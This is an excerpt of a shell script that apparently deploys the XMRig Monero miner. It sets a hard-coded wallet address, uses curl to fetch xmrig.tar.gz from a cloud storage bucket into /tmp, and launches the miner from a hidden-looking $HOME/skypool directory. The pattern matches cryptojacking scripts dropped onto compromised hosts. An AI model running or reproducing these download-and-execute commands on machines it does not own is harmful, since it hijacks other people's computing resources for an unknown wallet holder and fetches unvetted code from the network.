...
WALLET="8BshCpqtJwFZRzPmMs4T8KXhU7rWwQeSdZy8841pX55YWcsmQzjKzdpLX5EGZ9HpXLNdugZqSArGcXNKMDLj5ukMBnAAoyR"
...
if ! curl -L --progress-bar "https://delamain-1301685813.file.myqcloud.com/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://delamain-1301685813.file.myqcloud.com/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi
...
echo "[*] Setup complete"
COMMENT
cd $HOME/skypool && ./xmrig --config=$HOME/skypool/config.json